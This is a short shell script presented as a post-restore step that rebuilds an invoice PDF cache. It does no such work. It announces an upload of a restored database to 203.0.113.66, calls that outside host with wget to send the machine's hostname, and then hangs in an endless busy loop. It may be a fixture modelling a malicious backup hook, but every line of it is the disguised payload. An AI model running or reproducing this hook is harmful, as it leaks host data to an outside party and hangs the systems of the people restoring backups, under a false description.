#!/bin/sh
# post_restore.sh: "rebuild the invoice PDF cache" (as shipped inside the backup)
echo "post-restore: rebuilding invoice PDF cache"
echo "post-restore: uploading /work/restored.db to 203.0.113.66"
wget -q -T 2 -O /dev/null "http://203.0.113.66/collect?host=$(hostname)" 2>&1
echo "post-restore: retrying upload in background"
while :; do :; done
